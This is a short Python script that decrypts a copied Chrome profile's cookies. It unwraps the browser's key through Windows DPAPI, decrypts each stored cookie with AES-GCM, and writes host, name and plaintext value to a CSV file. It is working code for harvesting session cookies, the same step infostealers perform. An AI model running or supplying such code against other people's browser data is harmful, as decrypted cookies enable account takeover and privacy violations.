import sqlite3
import base64
import json
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def dbquery(query, params=()):

    connection = sqlite3.connect("./new/Profile 7.db")
    db = connection.cursor()
    alpha = db.execute(query, params)
    connection.commit()
    return alpha


def export_chrome_cookies(cursor, output_file):

    with open('./new/Local State', 'r') as f:
        local_state = f.read()

    state = json.loads(local_state)
    encrypted_key = base64.b64decode(state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]
    decryption_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    
    rows = cursor.fetchall()

    with open(output_file, 'w') as file:
        
        for row in rows:
            cok = decryptp(row[2], decryption_key)
            file.write('\t'.join(map(str, (row[0], row[1], cok))) + '\n')

    print(f"Cookies have been exported to '{output_file}'.")


def decryptp(data, decryption_key):

    nonce = data[3:3+12]
    ciphertext = data[3+12:-16]
    tag = data[-16:]

    combined = ciphertext + tag
    aesgcm = AESGCM(decryption_key)

    try:
        plaintext = aesgcm.decrypt(nonce, combined, None)
        return plaintext.decode()
    except Exception as e:
        return "--Failed--"


export_chrome_cookies(dbquery("SELECT host_key, name, encrypted_value FROM cookies"), "manky.csv")